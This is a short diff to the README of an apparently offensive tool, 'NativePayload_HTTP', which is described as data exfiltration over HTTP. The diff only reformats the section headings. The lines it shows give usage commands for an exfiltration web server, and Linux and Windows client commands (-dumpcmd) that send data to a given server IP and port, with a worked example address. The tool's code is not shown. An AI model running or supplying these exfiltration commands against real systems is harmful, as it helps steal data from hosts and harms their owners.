@@ -3,15 +3,15 @@ Data Exfiltration via HTTP Traffic (C# and Shell Script)
 
 this code has two parts: 1.Server-Side and 2.Client-Side
 
-Server-Side (linux only):
+# 1.Server-Side (linux only):
 ./NativePayload_HTTP.sh -exfilwebserver
 
-Client-Side (linux):
+# 2.Client-Side (linux):
 ./NativePayload_HTTP.sh  -dumpcmd  [ServerIPv4]  [Port]  [Internal-delay]
 
 Example: ./NativePayload_HTTP.sh  -dumpcmd   192.168.56.1  80  0.4
 
-Client-Side (windows):
+# 2.Client-Side (windows):
 NativePayload_HTTP.exe  -dumpcmd  [ServerIPv4]  [Port] 
 
 Example: NativePayload_HTTP.exe  -dumpcmd  192.168.56.1 80 
